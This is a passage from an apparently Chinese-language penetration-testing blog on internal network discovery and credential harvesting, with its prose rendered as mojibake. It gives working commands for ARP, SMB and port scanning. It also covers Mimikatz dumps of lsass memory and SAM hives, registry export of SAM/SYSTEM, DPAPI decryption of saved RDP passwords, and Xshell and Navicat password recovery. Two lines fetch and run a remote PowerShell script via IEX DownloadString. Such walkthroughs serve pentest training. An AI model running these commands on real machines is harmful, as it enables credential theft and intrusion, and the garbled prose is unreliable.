class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan.exe -t 10.10.10.0/24</span><br></pre></td></tr></table></figure><p>linux&#x2F;macos:<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a><br>windows:<a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309040952210.png" alt="image.png"></p><p>b.PowerShellçš„åˆ©ç”¨<br>Empireæ¸—é€æ¡†æ¶çš„Invoke-ARPScan.pslè„šæœ¬å¯åˆ©ç”¨ARPå‘ç°å†…ç½‘å­˜æ´»ä¸»æœºï¼ˆé¡¹ç›®è§Githubä¸Šçš„ç›¸å…³ç½‘é¡µ)ã€‚ä½¿ç”¨æ—¶ï¼Œéœ€è¦å°†è„šæœ¬å¯¼å…¥æ‰§è¡Œ<br>é¡¹ç›®åœ°å€:<a href=""></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-ARPScan.ps1</span><br><span class="line">Invoke-ARPScan -CIDR 10.10.10.0/24</span><br></pre></td></tr></table></figure><p>ä¹Ÿè¦å°†è„šæœ¬ä»£ç æ‰˜ç®¡åœ¨æœåŠ¡å™¨ä¸Šï¼Œé€šè¿‡PowerShellè¿œç¨‹åŠ è½½æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-ARPScan.ps1&#x27;)</span><br><span class="line">;Invoke-ARPscan -CIDR 10.10.10.0/24&quot;</span><br></pre></td></tr></table></figure><p>æ³¨:<br>å¦‚æœå‡ºç°PowershellæŠ¥é”™ï¼šå› ä¸ºåœ¨æ­¤ç³»ç»Ÿä¸Šè¿›åˆ¶è¿è¡Œè„šæœ¬ã€‚éœ€è¦è¿›è¡Œæ‰§è¡Œç­–ç•¥æ›´æ”¹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041005387.png" alt="image.png"></p><p>5.åŸºäºSMBåè®®å‘ç°å­˜æ´»ä¸»æœº<br>SMBä¸»è¦åŠŸèƒ½æ˜¯ä½¿ç½‘ç»œä¸Šçš„æœºå™¨èƒ½å¤Ÿå…±äº«è®¡ç®—æœºæ–‡ä»¶ã€æ‰“å°æœºã€ä¸²è¡Œç«¯å£å’Œé€šä¿¡èµ„æºã€‚CIFSæ¶ˆæ¯ä¸€èˆ¬ä½¿ç”¨NetBOISæˆ–TCPå‘é€ï¼Œåˆ†åˆ«ä½¿ç”¨139æˆ–445ç«¯å£ï¼Œç›®å‰å€¾å‘äº445ç«¯å£ã€‚<br>å®é™…åˆ©ç”¨ä¸­å¯ä»¥æ¢æµ‹å±€åŸŸç½‘ä¸­å­˜åœ¨çš„SMBæœåŠ¡ä»è€Œå‘ç°å†…ç½‘å­˜æ´»ä¸»æœºï¼Œå¤šé€‚ç”¨äºWindowsä¸»æœºçš„å‘ç°ã€‚<br>CrackMapExec æ˜¯ä¸€æ¬¾ååˆ†å¼ºå¤§çš„åæ¸—é€åˆ©ç”¨å·¥å…·<br>èƒ½å¤Ÿæšä¸¾ç™»å½•ç”¨æˆ·ï¼Œæšä¸¾SMBæœåŠ¡åˆ—è¡¨ï¼Œæ‰§è¡ŒWINRMæ”»å‡»ç­‰åŠŸèƒ½ã€‚<br>kaliä¸Šç›´æ¥apt-getå‘½ä»¤å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.0/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041014676.png" alt="image.png"></p><h3 id="2-å†…ç½‘ç«¯å£æ‰«æ"><a href="#2-å†…ç½‘ç«¯å£æ‰«æ" class="headerlink" title="2.å†…ç½‘ç«¯å£æ‰«æ"></a>2.å†…ç½‘ç«¯å£æ‰«æ</h3><p>a.åˆ©ç”¨Telnetæ¢æµ‹ç«¯å£<br>Telnetå¯ä»¥ç®€å•æµ‹è¯•æŒ‡å®šç«¯å£æ˜¯å¼€å¯è¿˜æ˜¯å…³é—­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041015755.png" alt="image.png"></p><p>b.Nmap<br>æ‰«ææŒ‡å®šç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80,88,135,139,443,8080,3306,3389 10.10.10.11</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041016826.png" alt="image.png"></p><p>å…¨ç«¯å£æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -p 1-65535 10.10.10.11</span><br></pre></td></tr></table></figure><p>æ‰«æå¹¶è·å–æŒ‡å®šç«¯å£ä¸Šå¼€æ”¾çš„æœåŠ¡ç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041019054.png"></p><p>c. åˆ©ç”¨PowerShellè¿›è¡Œç«¯å£æ‰«æ<br>Nishangæ˜¯åŸºäºPowerShellçš„æ¸—é€æµ‹è¯•ä¸“ç”¨æ¡†æ¶ï¼Œé›†æˆäº†å„ç§è„šæœ¬å’ŒPayload,å¹¿æ³›åº”ç”¨åŸŸæ¸—é€æµ‹è¯•å„é˜¶æ®µã€‚<br>NiShangçš„Scanæ¨¡å—ä¸­ä¹Ÿæœ‰ä¸€ä¸ªInvoke-PortScan.ps1è„šæœ¬ï¼Œå¯ä»¥ç”¨æ¥å¯¹ä¸»æœºè¿›è¡Œç«¯å£æ‰«æ<br>å¯¹å†…ç½‘çš„ä¸€ä¸ªä¸»æœºèŒƒå›´æ‰§è¡Œé»˜è®¤çš„ç«¯å£æ‰«æ<br>è„šæœ¬åœ°å€:<a href="https://github.com/chicagoadmin/nishang/blob/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Scan/Invoke-PortScan.ps1#L4">https://github.com/chicagoadmin/nishang/blob/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Scan/Invoke-PortScan.ps1#L4</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.20 -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041035136.png" alt="image.png"></p><p>å¯¹å†…ç½‘ä¸­çš„ä¸€ä¸ªä¸»æœºèŒƒå›´æ‰«ææŒ‡å®šçš„ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://your-ip:port/Invoke-portscan.ps1&#x27;);Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.20 -ResolveHost -ScanPort -Port 80,88,135,139,443,8080,3306,3389&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041042928.png" alt="image.png"> </p><h3 id="3-Metasploitæ¢æµ‹å†…ç½‘"><a href="#3-Metasploitæ¢æµ‹å†…ç½‘" class="headerlink" title="3.Metasploitæ¢æµ‹å†…ç½‘"></a>3.Metasploitæ¢æµ‹å†…ç½‘</h3><p>å…·ä½“åˆ©ç”¨æ–¹æ³•è‡ªè¡ŒæŸ¥é˜…ç›¸å…³æ–‡æ¡£<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041043063.png" alt="image.png"><br>ä¾‹: åŸºäºARPæ¢æµ‹å­˜æ´»ä¸»æœº<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041114036.png" alt="image.png"></p><h3 id="4-è·å–ç«¯å£Bannerä¿¡æ¯"><a href="#4-è·å–ç«¯å£Bannerä¿¡æ¯" class="headerlink" title="4.è·å–ç«¯å£Bannerä¿¡æ¯"></a>4.è·å–ç«¯å£Bannerä¿¡æ¯</h3><p>ç«¯å£Banner-ç«¯å£è¿æ¥çš„æ¬¢è¿è¯­<br>1.Ncè·å–banner</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv 10.10.10.15 21</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041117127.png" alt="image.png"></p><p>2.Telnetè·å–banner</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 10.10.10.15 21</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041118028.png" alt="image.png"></p><p>3.åˆ©ç”¨Nmapè·å–banner</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=banner 10.10.10.15</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041120947.png" alt="image.png"></p><h2 id="4-ç”¨æˆ·å‡­æ®æ”¶é›†"><a href="#4-ç”¨æˆ·å‡­æ®æ”¶é›†" class="headerlink" title="4.ç”¨æˆ·å‡­æ®æ”¶é›†"></a>4.ç”¨æˆ·å‡­æ®æ”¶é›†</h2><h3 id="1-è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼"><a href="#1-è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼" class="headerlink" title="1.è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼"></a>1.è·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œå€¼</h3><p>Windowsä¸­ï¼ŒSAMæ–‡ä»¶æ˜¯Windowsç”¨æˆ·çš„è´¦æˆ·æ•°æ®åº“ï¼Œä½äºç³»ç»Ÿçš„%SystemRoot%\System32\Config,å­˜å‚¨äº†æœ¬åœ°ç”¨æˆ·åï¼Œå¯†ç çš„å“ˆå¸Œå€¼ã€‚</p><p>ç”¨æˆ·ç™»é™†æ—¶ï¼Œè¾“å…¥çš„æ˜æ–‡å¯†ç è¢«è½¬æ¢ä¸ºå“ˆå¸Œå€¼ï¼Œç„¶åä¸SAMæ–‡ä»¶ä¸­çš„å“ˆå¸Œå€¼è¿›è¡Œå¯¹æ¯”ã€‚</p><p>lsass.exeæ˜¯Windowsçš„ä¸€ä¸ªç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºå®ç°ç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ã€‚ç”¨æˆ·è¾“å…¥å¯†ç ç™»å½•åï¼Œç™»é™†çš„åŸŸåï¼Œç”¨æˆ·åå’Œç™»å½•å‡­è¯ç­‰ä¿¡æ¯ä¼šè¢«å­˜å‚¨åœ¨lsass.exeè¿›ç¨‹ç©ºé—´ä¸­ï¼Œç”¨æˆ·çš„æ˜æ–‡å¯†ç ç»è¿‡WDigestå’ŒTspkgæ¨¡å—è°ƒç”¨åä¼šå¯¹å…¶ä½¿ç”¨å¯é€†çš„ç®—æ³•è¿›è¡ŒåŠ å¯†å¹¶å­˜å‚¨åœ¨å†…å­˜ä¸­ã€‚</p><p>è·å–å¯†ç hashçš„å·¥å…·å¾ˆå¤šï¼Œå¤§å¤šæ˜¯</p><ol><li>è¯»å–SAMæ–‡ä»¶</li><li>è®¿é—®lsass.exeè¿›ç¨‹çš„å†…å­˜æ•°æ®ç­‰æ“ä½œå®ç°</li></ol><p>ä¸€èˆ¬éœ€è¦å…ˆææƒ</p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimakatzæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å‡­è¯è½¬å‚¨å¼€æºç¨‹åºï¼Œå¯ä»¥å¸®åŠ©æµ‹è¯•äººå‘˜æå‡è¿›ç¨‹æƒé™ã€æ³¨å…¥è¿›ç¨‹ã€è¯»å–è¿›ç¨‹å†…å­˜ç­‰ï¼Œå¹¿æ³›ç”¨äºå†…ç½‘æ¸—é€æµ‹è¯•é¢†åŸŸã€‚</p><p>é¡¹ç›®åœ°å€:<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>1.åœ¨çº¿è¯»å–lsassè¿›ç¨‹å†…å­˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br><span class="line">#privilege::debug ç”¨äºæå‡è‡³DebugPrivilegeæƒé™</span><br><span class="line">#sekurlsa::logonpasswords ç”¨äºå¯¼å‡ºç”¨æˆ·å‡­è¯</span><br></pre></td></tr></table></figure><p>å¯ç›´æ¥ä»lsass.exeè¿›ç¨‹çš„å†…å­˜ä¸­è¯»å–å½“å‰å·²ç™»å½•ç”¨æˆ·çš„å‡­æ®<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041203029.png" alt="image.png"></p><p>2.ç¦»çº¿è¯»å–lsasså†…å­˜æ–‡ä»¶<br>å¯ä»¥å°†lsass.exeè¿›ç¨‹çš„å†…å­˜è½¬å‚¨ï¼Œå°†å†…å­˜æ–‡ä»¶å¯¼å‡ºåˆ°æœ¬åœ°åä½¿ç”¨Mimikatzè¿›è¡Œç¦»çº¿è¯»å–</p><p>å¾®è½¯æä¾›Procdumpå·¥å…·è¿›è¡Œå†…å­˜è½¬å‚¨<br>ä¸‹è½½åœ°å€:<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041201519.png" alt="image.png"></p><p>å¯¼å‡ºç”¨æˆ·å‡­æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br><span class="line">#sekurlsa::minidump lsass.dmp ç”¨äºåŠ è½½å†…å­˜æ–‡ä»¶</span><br><span class="line">#sekurlsa::logonpasswords ç”¨äºå¯¼å‡ºç”¨æˆ·å‡­æ®</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041207683.png" alt="image.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041857712.png" alt="image.png"></p><p>3.åœ¨çº¿è¯»å–æœ¬åœ°SAMæ–‡ä»¶<br>å°†mimikatz.exeä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºå¹¶æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br><span class="line">#token::elevate ç”¨äºæå‡è‡³Systemæƒé™</span><br><span class="line">#lsadump::sam ç”¨äºè¯»å–æœ¬åœ°SAMæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>è¯»å–SAMæ–‡ä»¶ä¸­ä¿å­˜çš„ç”¨æˆ·å‡­è¯ï¼Œå¯¼å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰æœ¬åœ°ç”¨æˆ·çš„å“ˆå¸Œå€¼<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041850899.png" alt="image.png"></p><p>4.ç¦»çº¿è¯»å–æœ¬åœ°SAMæ–‡ä»¶<br>ç¦»çº¿è¯»å–å°±æ˜¯å°†SAMæ–‡ä»¶å¯¼å‡ºï¼Œä½¿ç”¨mimikatzåŠ è½½å¹¶è¯»å–å…¶ä¸­çš„ç”¨æˆ·ç™»å½•å‡­æ®ç­‰ä¿¡æ¯ã€‚<br>Windowsä¸ºäº†æé«˜SAMæ–‡ä»¶çš„å®‰å…¨æ€§é˜²æ­¢ç¦»çº¿ç ´è§£ï¼Œä¼šå¯¹SAMæ–‡ä»¶ä½¿ç”¨å¯†é’¥åŠ å¯†ï¼Œè¿™ä¸ªå¯†é’¥å­˜å‚¨åœ¨SYSTEMæ–‡ä»¶ä¸­ï¼ŒåŸŸSAMä½äºç›¸åŒç›®å½•ä¸‹ã€‚</p><p>é¦–å…ˆï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸Šå¯¼å‡ºSAMå’ŒSYSTEMä¸¤ä¸ªæ–‡ä»¶ã€‚å› ä¸ºç³»ç»Ÿåœ¨è¿è¡Œæ—¶ï¼Œè¿™ä¸¤ä¸ª<br>æ–‡ä»¶æ˜¯è¢«é”å®šçš„ï¼Œæ‰€ä»¥éœ€è¦å€ŸåŠ©ä¸€äº›å·¥å…·æ¥å®ç°ï¼Œè€ŒPowerSploité¡¹ç›®ä¸­æä¾›çš„Invoke-NinjaCopy.ps1è„šæœ¬å¯ä»¥å®Œæˆè¿™é¡¹å·¥ä½œã€‚<br>è„šæœ¬åœ°å€:<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Windows\Temp\SAM</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination C:\Windows\Temp\SYSTEM</span><br></pre></td></tr></table></figure><p>ä¼šåœ¨Tempç›®å½•ä¸‹ç”ŸæˆSAMå’ŒSYSTEMä¸¤ä¸ªæ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041909320.png" alt="image.png"></p><p>ä¹Ÿå¯ä»¥åœ¨ç®¡ç†å‘˜æƒé™ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œé€šè¿‡ä¿å­˜æ³¨å†Œè¡¨çš„æ–¹å¼å¯¼å‡º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hive</span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br></pre></td></tr></table></figure><p>ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆsam.hive å’Œsystem.hive<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041911272.png" alt="image.png"></p><p>å°†å¯¼å‡ºçš„SAMå’ŒSYSTEMæ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°ï¼Œä½¿ç”¨mimikatzåŠ è½½è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309041912438.png" alt="image.png"></p><h3 id="2-è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®"><a href="#2-è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®" class="headerlink" title="2.è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®"></a>2.è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ®</h3><h4 id="1-è·å–RDPä¿å­˜çš„å‡­æ®"><a href="#1-è·å–RDPä¿å­˜çš„å‡­æ®" class="headerlink" title="1.è·å–RDPä¿å­˜çš„å‡­æ®"></a>1.è·å–RDPä¿å­˜çš„å‡­æ®</h4><p>RDPå‡­æ®éƒ½ä½¿ç”¨æ•°æ®ä¿æŠ¤APIä»¥åŠ å¯†å½¢å¼å­˜å‚¨åœ¨Windowsçš„å‡­æ®ç®¡ç†å™¨ä¸­<br>è·¯å¾„ä¸º %USERPROFILE%\AppData\Local\Microsoft\Credentials</p><p>ç¯å¢ƒè®¾ç½®<br>è¢«ç™»é™†æœºå¼€å¯è¿œç¨‹ç™»é™†ï¼Œå…³é—­ä»…å…è®¸è¿è¡Œä½¿ç”¨ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309042359940.png" alt="image.png"><br>ç ´è§£æœºè¿æ¥å—æ§æœº<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050014900.png" alt="imag.png"><br>æˆåŠŸè¿æ¥åˆ°è¿œç¨‹æ¡Œé¢<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050016996.png" alt="image.png"></p><p>æŸ¥çœ‹ä¸»æœºä¸Šä¿å­˜çš„è¿æ¥å‡­æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹å½“å‰ä¿å­˜çš„å‡­æ®</span><br><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050018804.png" alt="image.png">  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#éå†Credentialsç›®å½•ä¸‹ä¿å­˜çš„å‡­æ®</span><br><span class="line">dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050018087.png" alt="image.png"><br>ä½¿ç”¨mimikatzå¯¼å‡ºæŒ‡å®šçš„RDPè¿æ¥å‡­æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\ [å‡­æ®å]&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050029460.png" alt="image.png"><br>è·å¾—guidMasterKey,phData<br>phDataæ˜¯å‡­æ®çš„åŠ å¯†æ•°æ®<br>guidMasterKeyæ˜¯å‡­æ®çš„GUID</p><p>è®°å½•ä¸‹guidMasterKeyæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°GUIDå…³è”çš„MasterKey,MasterKeyæ˜¯åŠ å¯†å‡­æ®æ‰€ä½¿ç”¨çš„å¯†é’¥ã€‚<br>è®°å½•masterkey<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309050033091.png" alt="image.png"></p><p>æœ€åæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\[å‡­æ®å] /masterkey:[æŠ“åˆ°çš„masterkey]&quot; exit</span><br></pre></td></tr></table></figure><p>æˆåŠŸç ´è§£è·å¾—RDPé“­æ–‡å‡­æ®<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051336171.png" alt="image.png"><br>CredentialBlobå³æ˜¯Administratorå¯†ç </p><h4 id="2-è·å–Xshellä¿å­˜çš„å‡­æ®"><a href="#2-è·å–Xshellä¿å­˜çš„å‡­æ®" class="headerlink" title="2.è·å–Xshellä¿å­˜çš„å‡­æ®"></a>2.è·å–Xshellä¿å­˜çš„å‡­æ®</h4><p>Xshellä¼šå°†æœåŠ¡å™¨è¿æ¥ä¿¡æ¯ä¿å­˜åœ¨Sessionç›®å½•ä¸‹çš„.xshæ–‡ä»¶ä¸­<br>å¦‚æœç”¨æˆ·åœ¨è¿æ¥æ—¶å‹¾é€‰äº†è®°ä½ç”¨æˆ·å&#x2F;å¯†ç ï¼Œè¯¥æ–‡ä»¶ä¼šä¿å­˜è¿œç¨‹æœåŠ¡å™¨è¿æ¥çš„ç”¨æˆ·åå’ŒåŠä½ ç»™è¿‡åŠ å¯†åçš„å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSHELLç‰ˆæœ¬å¯¹åº”.xshæ–‡ä»¶è·¯å¾„</span><br><span class="line">Xshell 5 - %USERPROFILE%\Documents\NetSarang\Xshell\Sessions</span><br><span class="line">Xshell 6 - %USERPROFILE%\Documents\NetSarang Computer\6\Xshell\Sessions</span><br><span class="line">Xshell 7 - %USERPROFILE%\Documents\NetSarang Computer\7\Xshell\Sessions</span><br></pre></td></tr></table></figure><p>Xshellå…¨ç‰ˆæœ¬å‡­è¯ä¸€é”®æ¢å¤å·¥å…·SharpXDecrypt<br>é¡¹ç›®åœ°å€:<a href="https://github.com/JDArmy/SharpXDecrypt">https://github.com/JDArmy/SharpXDecrypt</a><br>ç›´æ¥è¿è¡Œå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\asus\Desktop\DEV\SharpXDecrypt\bin\Debug&gt; .\SharpXDecrypt.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051447437.png" alt="image.png"></p><p>Xshell 7 ä»¥å‰çš„ç‰ˆæœ¬,æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡ SharpDecryptPwdå·¥å…·è¿›è¡Œè§£å¯†,åŒ…æ‹¬Navicatã€TeamViewerã€FileZillaã€WinSCPå’ŒXmangegerç³»åˆ—äº§å“ã€‚<br>é¡¹ç›®åœ°å€:<a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a><br>å°†SharpDecryptPwdä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº,æ‰§è¡Œä»¥ä¸‹å‘½ä»¤,å¯ä»¥ç›´æ¥è·å–Xshellä¿å­˜çš„æ‰€æœ‰è¿æ¥å‡­æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpDecryptPwd.exe -Xmangager -p &quot;[å¯¹åº”ç‰ˆæœ¬Xshell.xshæ–‡ä»¶åœ°å€]&quot;</span><br></pre></td></tr></table></figure><p>Xshell 7 åçš„ç‰ˆæœ¬, Sessionç›®å½•ä¸­ä¸å†å­˜å‚¨ç”¨æˆ·å¯†ç ,ç”¨ä¸Šè¿°æ–¹æ³•è·å–çš„å¯†ç ä¸ºä¸€ä¸²ä¹±ç ,ä½¿ç”¨æ˜Ÿå·å¯†ç æŸ¥çœ‹å™¨ç›´æ¥æŸ¥çœ‹å¯†ç ã€‚<br>å·¥å…·ä¸‹è½½é“¾æ¥:<a href="https://www.lanzoui.com/i2tcmej">https://www.lanzoui.com/i2tcmej</a><br>æ‰“å¼€xshell7,é€‰æ‹©ç”¨æˆ·ç™»å½•ç•Œé¢,æŠŠå¯†ç æŸ¥çœ‹å™¨çš„æ”¾å¤§é•œå¯¹ç„¦åˆ°æ˜Ÿå‹å¯†ç æ¡†,å³å¯çœ‹åˆ°ç”¨æˆ·å¯†ç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051433621.png" alt="image.png"></p><h4 id="3-è·å–NaviCatä¿å­˜çš„å‡­æ®"><a href="#3-è·å–NaviCatä¿å­˜çš„å‡­æ®" class="headerlink" title="3.è·å–NaviCatä¿å­˜çš„å‡­æ®"></a>3.è·å–NaviCatä¿å­˜çš„å‡­æ®</h4><p>ç”¨æˆ·é»˜è®¤é€‰æ‹©ä¿å­˜å¯†ç ï¼ŒNavicatå°†ç™»å½•ä¿¡æ¯ä¿å­˜åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œä¸”ç»è¿‡å¯é€†ç®—æ³•åŠ å¯†ï¼Œä¸”Navicat&lt;&#x3D;11ç‰ˆæœ¬å’ŒNavicat&gt;&#x3D;12<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25375998/1682414743545-3a3152c6-36fa-48cd-9c5c-dd3a0620010b.png#averageHue=%23e7e7e6&clientId=u1e4135fb-5e1c-4&from=paste&height=173&id=ua515f842&originHeight=345&originWidth=1214&originalType=binary&ratio=2&rotation=0&showTitle=false&size=347190&status=done&style=none&taskId=u45523623-ae1e-4374-adb6-bbb48cabf4b&title=&width=607" alt="image.png"></p><p>ä½¿ç”¨SharpDecryptPwdå¯ä»¥ä¸€é”®å¯¼å‡ºå½“å‰è‘—åŠ ä¸Šç”¨æˆ·è¿æ¥è¿‡çš„æ‰€æœ‰æ•°æ®åº“çš„ç™»å½•å‡­æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpDecryptPwd.exe -NavicatCrypto</span><br></pre></td></tr></table></figure><p>Navicatè¿æ¥æ•°æ®åº“,ä¿å­˜å‡­è¯<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051550250.png" alt="image.png"></p><p>æˆåŠŸè¿æ¥åè¿è¡ŒSharpDecryptPwd.exe<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309051601525.png" 